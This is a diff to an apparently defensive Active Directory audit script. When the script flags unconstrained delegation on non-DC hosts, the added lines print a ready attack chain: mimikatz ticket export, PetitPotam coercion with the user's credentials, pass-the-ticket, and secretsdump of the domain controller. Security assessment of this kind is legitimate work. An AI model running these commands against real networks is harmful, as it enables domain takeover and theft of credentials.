@@ -448,6 +448,11 @@ if [ "$NON_DC_COUNT" -gt 0 ]; then
   while IFS= read -r system; do
     [ ! -z "$system" ] && echo -e "${RED}       └─ $system${NC}"
   done <<< "$NON_DC_UNCON"
+  FIRST_NON_DC_UNCON=$(echo "$NON_DC_UNCON" | head -1 | tr -d ' ')
+  echo -e "${GREY}          1) $FIRST_NON_DC_UNCON: mimikatz sekurlsa::tickets /export${NC}"
+  echo -e "${GREY}          2) petitpotam.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' <HOST_IP> $DC_IP${NC}"
+  echo -e "${GREY}          3) mimikatz: kerberos::ptt <DC_TGT>.kirbi${NC}"
+  echo -e "${GREY}          4) secretsdump.py -k -no-pass '$DOMAIN/DC01\$@$DC_FQDN'${NC}"
 else
   echo -e "${GREEN}[OK] No Unconstrained Delegation on non-DC systems${NC}"
 fi
